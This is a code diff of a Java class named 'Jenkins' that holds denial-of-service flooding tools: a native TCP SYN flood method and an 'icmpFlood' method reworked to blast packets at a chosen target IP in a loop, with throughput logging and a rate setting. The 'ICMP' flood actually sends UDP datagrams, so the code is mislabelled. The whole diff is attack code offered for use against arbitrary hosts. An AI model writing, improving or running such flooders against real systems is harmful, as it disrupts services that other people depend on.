@@ -74,7 +74,7 @@ public class Jenkins {
     }
 
     // TCP SYN Flood method
-    public native void tcpSynFlood(String targetIp, int targetPort, int bytesPerSecond);
+    public native boolean tcpSynFlood(String targetIp, int targetPort, int bytesPerSecond);
 
     static {
         System.out.println("Working Directory: " + System.getProperty("user.dir"));
@@ -107,36 +107,39 @@ public class Jenkins {
     // ICMP Flood method
     public void icmpFlood(String targetIp, int bytesPerSecond) {
         log("Starting ICMP flood attack on " + targetIp + " at " + bytesPerSecond + " bytes/second");
+        stopAttack = false;
 
-        try (DatagramSocket socket = new DatagramSocket()) {
+        try {
             InetAddress targetAddress = InetAddress.getByName(targetIp);
             byte[] buffer = new byte[64]; // ICMP header (8 bytes) + 56 bytes of data
             buffer[0] = 8; // ICMP Echo Request type
-            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, 0);
 
             long startTime = System.currentTimeMillis();
             long bytesSent = 0;
             int packetsSent = 0;
 
             while (!stopAttack) {
-                socket.send(packet);
-                bytesSent += buffer.length;
-                packetsSent++;
+                try (DatagramSocket socket = new DatagramSocket()) {
+                    DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, 0);
+                    socket.send(packet);
+                    bytesSent += buffer.length;
+                    packetsSent++;
 
-                if (packetsSent % 1000 == 0) { // Log every 1000 packets
-                    long elapsedTime = System.currentTimeMillis() - startTime;
-                    double actualMbps = (bytesSent * 8.0 / (1024 * 1024)) / (elapsedTime / 1000.0);
-                    log(String.format("Sent %d ICMP packets, %.2f MB, %.2f Mbps", packetsSent, bytesSent / (1024.0 * 1024), actualMbps));
-                }
-
-                // Add rate limiting if necessary
-                if (bytesSent >= bytesPerSecond) {
-                    long elapsedTime = System.currentTimeMillis() - startTime;
-                    if (elapsedTime < 1000) {
-                        Thread.sleep(1000 - elapsedTime);
+                    if (packetsSent % 1000 == 0) {
+                        long elapsedTime = System.currentTimeMillis() - startTime;
+                        double actualMbps = (bytesSent * 8.0 / (1024 * 1024)) / (elapsedTime / 1000.0);
+                        log(String.format("Sent %d ICMP packets, %.2f MB, %.2f Mbps", packetsSent, bytesSent / (1024.0 * 1024), actualMbps));
                     }
-                    startTime = System.currentTimeMillis();
-                    bytesSent = 0;
+
+                    // Rate limiting
+                    if (bytesSent >= bytesPerSecond) {
+                        long elapsedTime = System.currentTimeMillis() - startTime;
+                        if (elapsedTime < 1000) {
+                            Thread.sleep(1000 - elapsedTime);
+                        }
+                        startTime = System.currentTimeMillis();
+                        bytesSent = 0;
+                    }
                 }
             }
         } catch (Exception e) {
